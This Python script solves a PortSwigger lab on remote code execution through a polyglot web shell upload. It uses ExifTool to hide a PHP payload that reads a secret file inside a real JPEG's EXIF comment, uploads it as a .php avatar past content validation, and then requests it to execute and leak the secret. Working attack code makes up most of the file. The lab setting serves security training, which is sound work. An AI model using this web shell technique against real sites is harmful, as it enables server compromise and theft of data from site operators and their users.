# Lab 06 — Remote code execution via polyglot web shell upload
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
#
# Vulnerability: The server validates the uploaded file's ACTUAL CONTENT
#                to confirm it's a genuine image, but doesn't account for
#                arbitrary data hidden in image METADATA fields
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   Use ExifTool to embed a PHP payload into a real JPEG's EXIF Comment
#   field, producing a file that is simultaneously a 100% valid image
#   (passes content/magic-byte validation) AND executable PHP (when
#   served with a .php extension and interpreted by the PHP engine).
#
#   Requires: ExifTool installed and on PATH, plus a source JPEG image
#   to use as the base (any small real JPEG will do).
#
# Usage: python file_upload_lab06.py <url> <path_to_source_jpg>

import sys
import os
import re
import shutil
import subprocess
import urllib3
from proxies import proxies
from file_upload_utils import banner, section, make_session, login, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_polyglot(source_jpg, output_path):
    """
    Use ExifTool to embed a PHP payload into the source JPEG's Comment
    field, saving the result to output_path with a .php extension.
    Returns True on success.
    """
    php_comment = (
        "<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
    )
    cmd = [
        "exiftool",
        f"-Comment={php_comment}",
        source_jpg,
        "-o", output_path
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode == 0, result.stdout, result.stderr


if __name__ == "__main__":
    banner()
    section("LAB 06 — RCE VIA POLYGLOT WEB SHELL UPLOAD")

    if len(sys.argv) != 3:
        print("  Usage: python file_upload_lab06.py <url> <path_to_source_jpg>")
        sys.exit(1)

    url = sys.argv[1]
    source_jpg = sys.argv[2]

    if not os.path.exists(source_jpg):
        print(f"  ✘  Source JPEG not found: {source_jpg}")
        sys.exit(1)

    if not shutil.which("exiftool"):
        print("  ✘  'exiftool' not found on PATH — install it first.")
        print("     (e.g. apt install libimage-exiftool-perl, or brew install exiftool)")
        sys.exit(1)

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    # ── Step 1: build the polyglot file locally ────────────────────────────
    print("\n  ── Step 1: build the PHP/JPG polyglot with ExifTool\n")
    output_path = "polyglot.php"
    success, out, err = build_polyglot(source_jpg, output_path)

    if not success:
        print(f"  ✘  exiftool failed: {err}")
        sys.exit(1)

    print(f"  ✔  Polyglot created: {output_path}")
    print(f"  ℹ  exiftool output: {out.strip()}\n")

    # ── Step 2: confirm a plain (non-image) PHP file is rejected ────────────
    print("  ── Step 2: confirm content validation blocks a plain PHP file\n")
    r_plain = session.post(
        f"{url}/my-account/avatar",
        files={"avatar": ("plain.php", b"<?php echo 'test'; ?>", "image/jpeg")}
    )
    print(f"  ℹ  Plain PHP upload status: {r_plain.status_code}")
    print_box("Response (should reject — not a real image)", r_plain.text[:300])

    # ── Step 3: upload the polyglot ────────────────────────────────────────
    print("\n  ── Step 3: upload the polyglot file\n")
    with open(output_path, "rb") as f:
        polyglot_bytes = f.read()

    r_upload = session.post(
        f"{url}/my-account/avatar",
        files={"avatar": ("polyglot.php", polyglot_bytes, "image/jpeg")}
    )
    check_status(r_upload, [200, 302], "Upload polyglot.php")

    # ── Step 4: request it and search for the START/END markers ──────────────
    print("\n  ── Step 4: request the polyglot to trigger execution\n")
    r_exec = session.get(f"{url}/files/avatars/polyglot.php")
    check_status(r_exec, 200, "GET /files/avatars/polyglot.php")

    match = re.search(r'START (.*?) END', r_exec.text, re.DOTALL)
    if match:
        print_box("LEAKED SECRET", match.group(1).strip())
    else:
        print("  ?  START/END markers not found — the response is likely")
        print("     mostly binary image data. Search it manually for 'START'.")
        print_box("Raw response (first 500 chars)", r_exec.text[:500])

    print()
    print("  ℹ  The file IS a genuine, valid JPEG — magic-byte/content")
    print("     validation correctly passes it. The PHP interpreter finds")
    print("     our payload hidden in the EXIF Comment field and executes")
    print("     it anyway, once served with a .php extension.")
